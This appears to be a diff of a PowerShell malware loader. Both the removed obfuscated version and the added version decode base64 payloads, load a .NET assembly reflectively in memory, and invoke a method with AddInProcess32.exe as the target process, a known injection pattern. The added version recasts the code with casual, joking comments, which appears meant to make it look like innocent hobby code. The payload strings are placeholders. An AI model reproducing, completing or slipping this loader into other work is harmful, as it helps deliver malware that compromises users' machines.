@@ -1,11 +1,23 @@
-$dadqdqwdwqdfqfqpoiu = 'C:\Windows\Microsoft.NET\' + 'Framework\v4.0.30319\' + 'AddInProcess32.exe';
-$dadadqwdq = '.';
-$dasdafqqeq = 'A';
-$ummtu = '----'.replace( $dadadqwdq, $dasdafqqeq );
-[Byte[]] $laWwJ = [System.Convert]::FromBase64String( $ummtu );
-$mbclK = '===='.replace( $dadadqwdq, $dasdafqqeq );
-[Byte[]] $anKlo = [System.Convert]::FromBase64String( $mbclK );
-$vKedc = "meupiru";
-$szXhh = "caguei" ;
-$eyXHj = "fodasedemais.";
-[System.AppDomain]::CurrentDomain.Load( $laWwJ ).GetType( $eyXHj + $vKedc ).GetMethod( $szXhh ).Invoke($null, [Object[]] ($dadqdqwdwqdfqfqpoiu, $anKlo) );
+# lol I hope this fixes it
+$sysPath = "$env:windir\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe"
+# bruh this took forever to figure out
+$repDot = '.'
+# not touching this again 😭
+$repChar = 'A'
+# why does this even work lol
+$mainEnc = '----'.Replace($repDot, $repChar)
+# ok this is cursed but it runs
+$payload = [System.Convert]::FromBase64String($mainEnc)
+# don’t ask how, it just does
+$keyEnc = '===='.Replace($repDot, $repChar)
+# testing something real quick
+$keyBytes = [System.Convert]::FromBase64String($keyEnc)
+# reminder to clean this up later
+$cls = 'meupiru'
+# chatgpt made this ngl
+$mtd = 'caguei'
+# pls don’t break now 🙏
+$ns = 'fodasedemais.'
+# idk why this is needed but it is
+[System.AppDomain]::CurrentDomain.Load($payload).GetType($ns + $cls).GetMethod($mtd).Invoke($null, [Object[]] ($sysPath, $keyBytes))
+# yolo moment right here
